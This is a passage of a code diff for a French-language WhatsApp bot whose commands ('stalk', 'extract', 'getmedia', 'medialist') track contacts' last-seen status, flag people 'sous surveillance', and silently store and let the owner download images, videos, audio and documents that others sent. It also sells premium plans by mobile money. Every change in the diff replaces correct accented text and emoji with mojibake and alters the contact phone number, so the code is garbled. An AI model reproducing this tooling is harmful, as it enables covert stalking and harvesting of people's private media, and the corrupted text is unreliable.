+          text += `   ðŸ• DerniÃ¨re vue: ${tracker.lastSeen}\n`;
         }
         
-        // Médias stockés
+        // MÃ©dias stockÃ©s
         const medias = mediaStore.get(targetNumber);
         if (medias) {
-          text += `\n📁 *Médias reçus:* ${medias.length}\n`;
+          text += `\nðŸ“ *MÃ©dias reÃ§us:* ${medias.length}\n`;
         }
         
         // Sous surveillance?
         if (watchList.has(targetNumber)) {
-          text += `\n🔴 *Sous surveillance!*\n`;
+          text += `\nðŸ”´ *Sous surveillance!*\n`;
         }
         
         // Banni?
         if (db.isBanned(targetJid)) {
-          text += `\n🚫 *BANNI du bot*\n`;
+          text += `\nðŸš« *BANNI du bot*\n`;
         }
         
-        // Récupérer la photo de profil
+        // RÃ©cupÃ©rer la photo de profil
         try {
           const ppUrl = await hani.profilePictureUrl(targetJid, "image");
           if (ppUrl) {
@@ -6665,60 +6665,60 @@ C'est ton identifiant WhatsApp.
         
       } catch (error) {
         console.error("[STALK] Erreur:", error);
-        return send(`❌ Erreur: ${error.message}`);
+        return send(`âŒ Erreur: ${error.message}`);
       }
     }
 
-    // ────────── 📁 EXTRACTION DE MÉDIAS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“ EXTRACTION DE MÃ‰DIAS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "extract":
     case "extraire":
     case "medias": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
       if (!targetNumber) {
-        // Liste de tous les utilisateurs avec des médias
-        if (mediaStore.size === 0) return send("📭 Aucun média stocké.\n\nLes médias sont automatiquement collectés quand quelqu'un t'envoie une image, vidéo, audio ou document.");
+        // Liste de tous les utilisateurs avec des mÃ©dias
+        if (mediaStore.size === 0) return send("ðŸ“­ Aucun mÃ©dia stockÃ©.\n\nLes mÃ©dias sont automatiquement collectÃ©s quand quelqu'un t'envoie une image, vidÃ©o, audio ou document.");
         
-        let list = "📁 *Médias disponibles par utilisateur*\n━━━━━━━━━━━━━━━━━━━━━\n\n";
+        let list = "ðŸ“ *MÃ©dias disponibles par utilisateur*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n";
         let i = 1;
         for (const [num, medias] of mediaStore) {
           const firstMedia = medias[0];
           list += `${i}. ${formatPhoneNumber(num)}\n`;
-          list += `   👤 ${firstMedia?.pushName || "Inconnu"}\n`;
-          list += `   📊 ${medias.length} média(s)\n\n`;
+          list += `   ðŸ‘¤ ${firstMedia?.pushName || "Inconnu"}\n`;
+          list += `   ðŸ“Š ${medias.length} mÃ©dia(s)\n\n`;
           i++;
         }
-        list += `\n💡 Utilise \`.extract @user\` ou \`.extract [numéro]\` pour voir les détails.`;
+        list += `\nðŸ’¡ Utilise \`.extract @user\` ou \`.extract [numÃ©ro]\` pour voir les dÃ©tails.`;
         return send(list);
       }
       
       const userMedias = mediaStore.get(targetNumber);
       if (!userMedias || userMedias.length === 0) {
-        return send(`📭 Aucun média stocké pour ${formatPhoneNumber(targetNumber)}`);
+        return send(`ðŸ“­ Aucun mÃ©dia stockÃ© pour ${formatPhoneNumber(targetNumber)}`);
       }
       
-      let list = `📁 *Médias de ${formatPhoneNumber(targetNumber)}*\n`;
-      list += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
+      let list = `ðŸ“ *MÃ©dias de ${formatPhoneNumber(targetNumber)}*\n`;
+      list += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
       
       userMedias.forEach((media, index) => {
         list += `*${index + 1}.* ${media.type?.toUpperCase()}\n`;
-        list += `   📅 ${media.date}\n`;
-        if (media.caption) list += `   💬 "${media.caption.substring(0, 50)}..."\n`;
-        if (media.fileName) list += `   📄 ${media.fileName}\n`;
+        list += `   ðŸ“… ${media.date}\n`;
+        if (media.caption) list += `   ðŸ’¬ "${media.caption.substring(0, 50)}..."\n`;
+        if (media.fileName) list += `   ðŸ“„ ${media.fileName}\n`;
         list += "\n";
       });
       
-      list += `\n💡 Utilise \`.getmedia ${targetNumber} [n°]\` pour télécharger.`;
+      list += `\nðŸ’¡ Utilise \`.getmedia ${targetNumber} [nÂ°]\` pour tÃ©lÃ©charger.`;
       return send(list);
     }
 
     case "getmedia":
     case "dlmedia": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const parts = args?.split(" ") || [];
       let targetNumber = parts[0]?.replace(/[^0-9]/g, "");
@@ -6727,15 +6727,15 @@ C'est ton identifiant WhatsApp.
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
-      if (!targetNumber) return send("❌ Usage: .getmedia [numéro] [n°]\nEx: .getmedia 2250150000000 1");
+      if (!targetNumber) return send("âŒ Usage: .getmedia [numÃ©ro] [nÂ°]\nEx: .getmedia 2250150000000 1");
       
       const userMedias = mediaStore.get(targetNumber);
       if (!userMedias || userMedias.length === 0) {
-        return send(`📭 Aucun média pour ${formatPhoneNumber(targetNumber)}`);
+        return send(`ðŸ“­ Aucun mÃ©dia pour ${formatPhoneNumber(targetNumber)}`);
       }
       
       if (mediaIndex < 0 || mediaIndex >= userMedias.length) {
-        return send(`❌ Numéro invalide. Ce contact a ${userMedias.length} média(s).`);
+        return send(`âŒ NumÃ©ro invalide. Ce contact a ${userMedias.length} mÃ©dia(s).`);
       }
       
       const media = userMedias[mediaIndex];
@@ -6748,7 +6748,7 @@ C'est ton identifiant WhatsApp.
           { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
         );
         
-        const caption = `📁 *Média extrait*\n\n👤 De: ${media.pushName}\n📱 ${formatPhoneNumber(targetNumber)}\n📅 ${media.date}\n📝 Type: ${media.type}${media.caption ? "\n\n💬 " + media.caption : ""}`;
+        const caption = `ðŸ“ *MÃ©dia extrait*\n\nðŸ‘¤ De: ${media.pushName}\nðŸ“± ${formatPhoneNumber(targetNumber)}\nðŸ“… ${media.date}\nðŸ“ Type: ${media.type}${media.caption ? "\n\nðŸ’¬ " + media.caption : ""}`;
         
         const botJid = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
         
@@ -6769,15 +6769,15 @@ C'est ton identifiant WhatsApp.
         
         return;
       } catch (e) {
-        return send(`❌ Impossible de télécharger ce média: ${e.message}`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger ce mÃ©dia: ${e.message}`);
       }
     }
 
     case "medialist":
     case "allmedia": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
-      if (mediaStore.size === 0) return send("📭 Aucun média stocké.");
+      if (mediaStore.size === 0) return send("ðŸ“­ Aucun mÃ©dia stockÃ©.");
       
       let total = 0;
       let byType = { image: 0, video: 0, audio: 0, document: 0 };
@@ -6789,76 +6789,76 @@ C'est ton identifiant WhatsApp.
         });
       }
       
-      let text = `📁 *Statistiques médias*\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
-      text += `👥 Utilisateurs: ${mediaStore.size}\n`;
-      text += `📊 Total médias: ${total}\n\n`;
-      text += `📸 Images: ${byType.image}\n`;
-      text += `🎥 Vidéos: ${byType.video}\n`;
-      text += `🎵 Audios: ${byType.audio}\n`;
-      text += `📄 Documents: ${byType.document}\n`;
-      text += `\n💡 Utilise \`.extract\` pour voir par utilisateur.`;
+      let text = `ðŸ“ *Statistiques mÃ©dias*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+      text += `ðŸ‘¥ Utilisateurs: ${mediaStore.size}\n`;
+      text += `ðŸ“Š Total mÃ©dias: ${total}\n\n`;
+      text += `ðŸ“¸ Images: ${byType.image}\n`;
+      text += `ðŸŽ¥ VidÃ©os: ${byType.video}\n`;
+      text += `ðŸŽµ Audios: ${byType.audio}\n`;
+      text += `ðŸ“„ Documents: ${byType.document}\n`;
+      text += `\nðŸ’¡ Utilise \`.extract\` pour voir par utilisateur.`;
       
       return send(text);
     }
 
     case "clearmedia": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       
       if (targetNumber) {
         mediaStore.delete(targetNumber);
-        return send(`✅ Médias supprimés pour ${formatPhoneNumber(targetNumber)}`);
+        return send(`âœ… MÃ©dias supprimÃ©s pour ${formatPhoneNumber(targetNumber)}`);
       } else {
         mediaStore.clear();
-        return send("✅ Tous les médias stockés ont été supprimés.");
+        return send("âœ… Tous les mÃ©dias stockÃ©s ont Ã©tÃ© supprimÃ©s.");
       }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // 💎 COMMANDES PREMIUM - SYSTÈME D'ABONNEMENT
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // ðŸ’Ž COMMANDES PREMIUM - SYSTÃˆME D'ABONNEMENT
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     case "premium":
     case "myplan": {
       const info = premiumDB.getPremiumInfo(sender);
-      const planEmojis = { FREE: "🆓", BRONZE: "🥉", ARGENT: "🥈", OR: "🥇", DIAMANT: "💎", LIFETIME: "👑" };
-      const emoji = planEmojis[info.plan] || "📋";
+      const planEmojis = { FREE: "ðŸ†“", BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
+      const emoji = planEmojis[info.plan] || "ðŸ“‹";
       
-      let text = `${emoji} ═══════════════════════════\n`;
+      let text = `${emoji} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       text += `   *VOTRE ABONNEMENT PREMIUM*\n`;
-      text += `═══════════════════════════\n\n`;
-      text += `👤 *Utilisateur:* ${senderName || "Inconnu"}\n`;
-      text += `📱 *Numéro:* +${sender.split("@")[0]}\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
+      text += `ðŸ‘¤ *Utilisateur:* ${senderName || "Inconnu"}\n`;
+      text += `ðŸ“± *NumÃ©ro:* +${sender.split("@")[0]}\n`;
       text += `${emoji} *Plan actuel:* ${info.plan}\n`;
       
       if (info.plan === "FREE") {
-        text += `\n📊 *Limites:*\n`;
-        text += `   • ${info.dailyCommands}/${info.dailyLimit} commandes/jour\n`;
-        text += `   • Fonctionnalités de base uniquement\n`;
-        text += `\n💡 *Passez à Premium pour:*\n`;
-        text += `   • Plus de commandes par jour\n`;
-        text += `   • Accès aux fonctionnalités exclusives\n`;
-        text += `   • Support prioritaire\n`;
-        text += `\n📋 Tapez \`.plans\` pour voir les offres`;
+        text += `\nðŸ“Š *Limites:*\n`;
+        text += `   â€¢ ${info.dailyCommands}/${info.dailyLimit} commandes/jour\n`;
+        text += `   â€¢ FonctionnalitÃ©s de base uniquement\n`;
+        text += `\nðŸ’¡ *Passez Ã  Premium pour:*\n`;
+        text += `   â€¢ Plus de commandes par jour\n`;
+        text += `   â€¢ AccÃ¨s aux fonctionnalitÃ©s exclusives\n`;
+        text += `   â€¢ Support prioritaire\n`;
+        text += `\nðŸ“‹ Tapez \`.plans\` pour voir les offres`;
       } else if (info.plan === "LIFETIME") {
-        text += `\n⭐ *ACCÈS ILLIMITÉ À VIE*\n`;
-        text += `   • Toutes les fonctionnalités\n`;
-        text += `   • Aucune limite de commandes\n`;
-        text += `   • Support VIP prioritaire\n`;
-        text += `\n🙏 Merci pour votre confiance!`;
+        text += `\nâ­ *ACCÃˆS ILLIMITÃ‰ Ã€ VIE*\n`;
+        text += `   â€¢ Toutes les fonctionnalitÃ©s\n`;
+        text += `   â€¢ Aucune limite de commandes\n`;
+        text += `   â€¢ Support VIP prioritaire\n`;
+        text += `\nðŸ™ Merci pour votre confiance!`;
       } else {
-        text += `\n📊 *Statistiques:*\n`;
-        text += `   • Commandes aujourd'hui: ${info.dailyCommands}/${info.dailyLimit === Infinity ? "∞" : info.dailyLimit}\n`;
-        text += `   • Expire le: ${new Date(info.expiresAt).toLocaleDateString("fr-FR")}\n`;
+        text += `\nðŸ“Š *Statistiques:*\n`;
+        text += `   â€¢ Commandes aujourd'hui: ${info.dailyCommands}/${info.dailyLimit === Infinity ? "âˆž" : info.dailyLimit}\n`;
+        text += `   â€¢ Expire le: ${new Date(info.expiresAt).toLocaleDateString("fr-FR")}\n`;
         const daysLeft = Math.ceil((new Date(info.expiresAt) - new Date()) / (1000 * 60 * 60 * 24));
-        text += `   • Jours restants: ${daysLeft}\n`;
-        text += `\n✨ *Avantages actifs:*\n`;
-        text += `   • Commandes illimitées ou augmentées\n`;
-        text += `   • Fonctionnalités premium débloquées\n`;
+        text += `   â€¢ Jours restants: ${daysLeft}\n`;
+        text += `\nâœ¨ *Avantages actifs:*\n`;
+        text += `   â€¢ Commandes illimitÃ©es ou augmentÃ©es\n`;
+        text += `   â€¢ FonctionnalitÃ©s premium dÃ©bloquÃ©es\n`;
         if (daysLeft <= 7) {
-          text += `\n⚠️ *Votre abonnement expire bientôt!*\n`;
+          text += `\nâš ï¸ *Votre abonnement expire bientÃ´t!*\n`;
           text += `Renouvelez avec \`.upgrade ${info.plan.toLowerCase()}\``;
         }
       }
@@ -6869,41 +6869,41 @@ C'est ton identifiant WhatsApp.
     case "plans":
     case "tarifs":
     case "offres": {
-      let text = `💎 ═══════════════════════════\n`;
+      let text = `ðŸ’Ž â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       text += `   *PLANS PREMIUM DISPONIBLES*\n`;
-      text += `═══════════════════════════\n\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      text += `🆓 *FREE* (Gratuit)\n`;
-      text += `   • 20 commandes/jour\n`;
-      text += `   • Fonctionnalités de base\n\n`;
+      text += `ðŸ†“ *FREE* (Gratuit)\n`;
+      text += `   â€¢ 20 commandes/jour\n`;
+      text += `   â€¢ FonctionnalitÃ©s de base\n\n`;
       
-      text += `🥉 *BRONZE* - 500 FCFA/mois\n`;
-      text += `   • 100 commandes/jour\n`;
-      text += `   • Support standard\n\n`;
+      text += `ðŸ¥‰ *BRONZE* - 500 FCFA/mois\n`;
+      text += `   â€¢ 100 commandes/jour\n`;
+      text += `   â€¢ Support standard\n\n`;
       
-      text += `🥈 *ARGENT* - 1 000 FCFA/mois\n`;
-      text += `   • 300 commandes/jour\n`;
-      text += `   • Accès fonctions avancées\n\n`;
+      text += `ðŸ¥ˆ *ARGENT* - 1 000 FCFA/mois\n`;
+      text += `   â€¢ 300 commandes/jour\n`;
+      text += `   â€¢ AccÃ¨s fonctions avancÃ©es\n\n`;
       
-      text += `🥇 *OR* - 2 000 FCFA/mois\n`;
-      text += `   • Commandes illimitées\n`;
-      text += `   • Toutes les fonctionnalités\n`;
-      text += `   • Support prioritaire\n\n`;
+      text += `ðŸ¥‡ *OR* - 2 000 FCFA/mois\n`;
+      text += `   â€¢ Commandes illimitÃ©es\n`;
+      text += `   â€¢ Toutes les fonctionnalitÃ©s\n`;
+      text += `   â€¢ Support prioritaire\n\n`;
       
-      text += `💎 *DIAMANT* - 5 000 FCFA/mois\n`;
-      text += `   • Tout OR +\n`;
-      text += `   • Fonctionnalités exclusives\n`;
-      text += `   • Support VIP 24/7\n\n`;
+      text += `ðŸ’Ž *DIAMANT* - 5 000 FCFA/mois\n`;
+      text += `   â€¢ Tout OR +\n`;
+      text += `   â€¢ FonctionnalitÃ©s exclusives\n`;
+      text += `   â€¢ Support VIP 24/7\n\n`;
       
-      text += `👑 *LIFETIME* - 15 000 FCFA (unique)\n`;
-      text += `   • Accès à vie illimité\n`;
-      text += `   • Toutes les fonctionnalités\n`;
-      text += `   • Support VIP prioritaire\n\n`;
+      text += `ðŸ‘‘ *LIFETIME* - 15 000 FCFA (unique)\n`;
+      text += `   â€¢ AccÃ¨s Ã  vie illimitÃ©\n`;
+      text += `   â€¢ Toutes les fonctionnalitÃ©s\n`;
+      text += `   â€¢ Support VIP prioritaire\n\n`;
       
-      text += `═══════════════════════════\n`;
-      text += `📲 *Contact:* +2250150252467\n`;
-      text += `💰 *Paiement:* Wave, Orange Money, MTN\n`;
-      text += `\n💡 Pour s'abonner: \`.upgrade <plan>\``;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      text += `ðŸ“² *Contact:* +22550252467\n`;
+      text += `ðŸ’° *Paiement:* Wave, Orange Money, MTN\n`;
+      text += `\nðŸ’¡ Pour s'abonner: \`.upgrade <plan>\``;
       
       return send(text);
     }
@@ -6915,37 +6915,37 @@ C'est ton identifiant WhatsApp.
       const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
       
       if (!plan || !validPlans.includes(plan)) {
-        let text = `📋 *Usage:* .upgrade <plan>\n\n`;
+        let text = `ðŸ“‹ *Usage:* .upgrade <plan>\n\n`;
         text += `*Plans disponibles:*\n`;
-        text += `• bronze - 500 FCFA/mois\n`;
-        text += `• argent - 1 000 FCFA/mois\n`;
-        text += `• or - 2 000 FCFA/mois\n`;
-        text += `• diamant - 5 000 FCFA/mois\n`;
-        text += `• lifetime - 15 000 FCFA (unique)\n\n`;
-        text += `💡 Exemple: \`.upgrade or\``;
+        text += `â€¢ bronze - 500 FCFA/mois\n`;
+        text += `â€¢ argent - 1 000 FCFA/mois\n`;
+        text += `â€¢ or - 2 000 FCFA/mois\n`;
+        text += `â€¢ diamant - 5 000 FCFA/mois\n`;
+        text += `â€¢ lifetime - 15 000 FCFA (unique)\n\n`;
+        text += `ðŸ’¡ Exemple: \`.upgrade or\``;
         return send(text);
       }
       
       const prices = { BRONZE: 500, ARGENT: 1000, OR: 2000, DIAMANT: 5000, LIFETIME: 15000 };
       const price = prices[plan];
-      const planEmojis = { BRONZE: "🥉", ARGENT: "🥈", OR: "🥇", DIAMANT: "💎", LIFETIME: "👑" };
+      const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
       
-      let text = `${planEmojis[plan]} ═══════════════════════════\n`;
+      let text = `${planEmojis[plan]} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       text += `   *DEMANDE D'ABONNEMENT*\n`;
-      text += `═══════════════════════════\n\n`;
-      text += `📦 *Plan choisi:* ${plan}\n`;
-      text += `💰 *Prix:* ${price.toLocaleString()} FCFA${plan === "LIFETIME" ? " (paiement unique)" : "/mois"}\n\n`;
-      text += `📲 *Pour finaliser votre achat:*\n\n`;
-      text += `1️⃣ Envoyez ${price} FCFA via:\n`;
-      text += `   • Wave: +2250150252467\n`;
-      text += `   • Orange Money: +2250150252467\n`;
-      text += `   • MTN Money: +2250150252467\n\n`;
-      text += `2️⃣ Envoyez une capture du paiement\n`;
-      text += `   à ce numéro WhatsApp\n\n`;
-      text += `3️⃣ Recevez votre code d'activation\n\n`;
-      text += `⏱️ Activation en moins de 5 minutes!\n\n`;
-      text += `═══════════════════════════\n`;
-      text += `📞 *Contact:* wa.me/2250150252467`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
+      text += `ðŸ“¦ *Plan choisi:* ${plan}\n`;
+      text += `ðŸ’° *Prix:* ${price.toLocaleString()} FCFA${plan === "LIFETIME" ? " (paiement unique)" : "/mois"}\n\n`;
+      text += `ðŸ“² *Pour finaliser votre achat:*\n\n`;
+      text += `1ï¸âƒ£ Envoyez ${price} FCFA via:\n`;
+      text += `   â€¢ Wave: +22550252467\n`;
+      text += `   â€¢ Orange Money: +22550252467\n`;
+      text += `   â€¢ MTN Money: +22550252467\n\n`;
+      text += `2ï¸âƒ£ Envoyez une capture du paiement\n`;
+      text += `   Ã  ce numÃ©ro WhatsApp\n\n`;
+      text += `3ï¸âƒ£ Recevez votre code d'activation\n\n`;
+      text += `â±ï¸ Activation en moins de 5 minutes!\n\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      text += `ðŸ“ž *Contact:* wa.me/22550252467`;
       
       return send(text);
     }
@@ -6954,63 +6954,63 @@ C'est ton identifiant WhatsApp.
     case "activer":
     case "code": {
       if (!args) {
-        return send(`📋 *Usage:* .redeem <code>\n\n💡 Exemple: \`.redeem ABC123XYZ\`\n\nVous recevrez votre code après paiement.`);
+        return send(`ðŸ“‹ *Usage:* .redeem <code>\n\nðŸ’¡ Exemple: \`.redeem ABC123XYZ\`\n\nVous recevrez votre code aprÃ¨s paiement.`);
       }
       
       const result = premiumDB.redeemCode(args.trim().toUpperCase(), sender);
       
       if (result.success) {
-        const planEmojis = { BRONZE: "🥉", ARGENT: "🥈", OR: "🥇", DIAMANT: "💎", LIFETIME: "👑" };
-        let text = `✅ ═══════════════════════════\n`;
-        text += `   *CODE ACTIVÉ AVEC SUCCÈS!*\n`;
-        text += `═══════════════════════════\n\n`;
+        const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
+        let text = `âœ… â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+        text += `   *CODE ACTIVÃ‰ AVEC SUCCÃˆS!*\n`;
+        text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
         text += `${planEmojis[result.plan]} *Plan:* ${result.plan}\n`;
         if (result.plan === "LIFETIME") {
-          text += `⭐ *Durée:* À VIE!\n`;
+          text += `â­ *DurÃ©e:* Ã€ VIE!\n`;
         } else {
-          text += `📅 *Durée:* ${result.duration} jours\n`;
-          text += `🗓️ *Expire le:* ${new Date(result.expiresAt).toLocaleDateString("fr-FR")}\n`;
+          text += `ðŸ“… *DurÃ©e:* ${result.duration} jours\n`;
+          text += `ðŸ—“ï¸ *Expire le:* ${new Date(result.expiresAt).toLocaleDateString("fr-FR")}\n`;
         }
-        text += `\n🎉 Profitez de vos avantages premium!\n`;
-        text += `📋 Tapez \`.premium\` pour voir votre plan`;
+        text += `\nðŸŽ‰ Profitez de vos avantages premium!\n`;
+        text += `ðŸ“‹ Tapez \`.premium\` pour voir votre plan`;
         return send(text);
       } else {
-        return send(`❌ *Erreur:* ${result.message}\n\n💡 Vérifiez que le code est correct et n'a pas déjà été utilisé.`);
+        return send(`âŒ *Erreur:* ${result.message}\n\nðŸ’¡ VÃ©rifiez que le code est correct et n'a pas dÃ©jÃ  Ã©tÃ© utilisÃ©.`);
       }
     }
 
-    // ────────── COMMANDES OWNER PREMIUM ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ COMMANDES OWNER PREMIUM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     case "gencode": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const plan = args?.toUpperCase();
       const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
       
       if (!plan || !validPlans.includes(plan)) {
-        return send(`📋 *Usage:* .gencode <plan>\n\n*Plans:* bronze, argent, or, diamant, lifetime\n\n💡 Exemple: \`.gencode or\``);
+        return send(`ðŸ“‹ *Usage:* .gencode <plan>\n\n*Plans:* bronze, argent, or, diamant, lifetime\n\nðŸ’¡ Exemple: \`.gencode or\``);
       }
       
       const result = premiumDB.generateCode(plan);
       
       if (result.success) {
-        let text = `✅ *Code généré avec succès!*\n\n`;
-        text += `📦 *Plan:* ${plan}\n`;
-        text += `🔑 *Code:* \`${result.code}\`\n`;
-        text += `📅 *Durée:* ${result.duration === "LIFETIME" ? "À vie" : result.duration + " jours"}\n\n`;
-        text += `💡 Envoyez ce code au client pour activation`;
+        let text = `âœ… *Code gÃ©nÃ©rÃ© avec succÃ¨s!*\n\n`;
+        text += `ðŸ“¦ *Plan:* ${plan}\n`;
+        text += `ðŸ”‘ *Code:* \`${result.code}\`\n`;
+        text += `ðŸ“… *DurÃ©e:* ${result.duration === "LIFETIME" ? "Ã€ vie" : result.duration + " jours"}\n\n`;
+        text += `ðŸ’¡ Envoyez ce code au client pour activation`;
         return send(text);
       } else {
-        return send(`❌ Erreur: ${result.message}`);
+        return send(`âŒ Erreur: ${result.message}`);
       }
     }
 
     case "gencodes": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const parts = args?.split(/\s+/);
       if (!parts || parts.length < 2) {
-        return send(`📋 *Usage:* .gencodes <plan> <nombre>\n\n💡 Exemple: \`.gencodes or 5\``);
+        return send(`ðŸ“‹ *Usage:* .gencodes <plan> <nombre>\n\nðŸ’¡ Exemple: \`.gencodes or 5\``);
       }
       
       const plan = parts[0].toUpperCase();
@@ -7018,37 +7018,37 @@ C'est ton identifiant WhatsApp.
       const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
       
       if (!validPlans.includes(plan)) {
-        return send(`❌ Plan invalide. Plans disponibles: bronze, argent, or, diamant, lifetime`);
+        return send(`âŒ Plan invalide. Plans disponibles: bronze, argent, or, diamant, lifetime`);
       }
       
       if (count < 1 || count > 20) {
-        return send(`❌ Nombre invalide. Entre 1 et 20 codes maximum.`);
+        return send(`âŒ Nombre invalide. Entre 1 et 20 codes maximum.`);
       }
       
-      let text = `✅ *${count} codes ${plan} générés:*\n\n`;
+      let text = `âœ… *${count} codes ${plan} gÃ©nÃ©rÃ©s:*\n\n`;
       for (let i = 0; i < count; i++) {
         const result = premiumDB.generateCode(plan);
         if (result.success) {
           text += `${i + 1}. \`${result.code}\`\n`;
         }
       }
-      text += `\n💡 Chaque code est à usage unique.`;
+      text += `\nðŸ’¡ Chaque code est Ã  usage unique.`;
       return send(text);
     }
 
     case "listcodes":
     case "codes": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const codes = premiumDB.getUnusedCodes();
       
       if (codes.length === 0) {
-        return send(`📋 *Aucun code disponible*\n\n💡 Générez des codes avec \`.gencode <plan>\``);
+        return send(`ðŸ“‹ *Aucun code disponible*\n\nðŸ’¡ GÃ©nÃ©rez des codes avec \`.gencode <plan>\``);
       }
       
-      let text = `🔑 ═══════════════════════════\n`;
-      text += `   *CODES NON UTILISÉS*\n`;
-      text += `═══════════════════════════\n\n`;
+      let text = `ðŸ”‘ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      text += `   *CODES NON UTILISÃ‰S*\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
       const byPlan = {};
       for (const c of codes) {
@@ -7057,20 +7057,20 @@ C'est ton identifiant WhatsApp.
       }
       
       for (const [plan, planCodes] of Object.entries(byPlan)) {
-        const planEmojis = { BRONZE: "🥉", ARGENT: "🥈", OR: "🥇", DIAMANT: "💎", LIFETIME: "👑" };
-        text += `${planEmojis[plan] || "📦"} *${plan}* (${planCodes.length}):\n`;
+        const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
+        text += `${planEmojis[plan] || "ðŸ“¦"} *${plan}* (${planCodes.length}):\n`;
         planCodes.forEach((code, i) => {
           text += `   ${i + 1}. \`${code}\`\n`;
         });
         text += `\n`;
       }
       
-      text += `📊 *Total:* ${codes.length} codes disponibles`;
+      text += `ðŸ“Š *Total:* ${codes.length} codes disponibles`;
       return send(text);
     }
 
     case "addpremium": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const parts = args?.split(/\s+/);
       let targetJid = mentioned[0];
@@ -7090,27 +7090,27 @@ C'est ton identifiant WhatsApp.
       }
       
       if (!targetJid || !plan) {
-        return send(`📋 *Usage:* .addpremium @user <plan> [jours]\n\n💡 Exemple: \`.addpremium @user or 30\``);
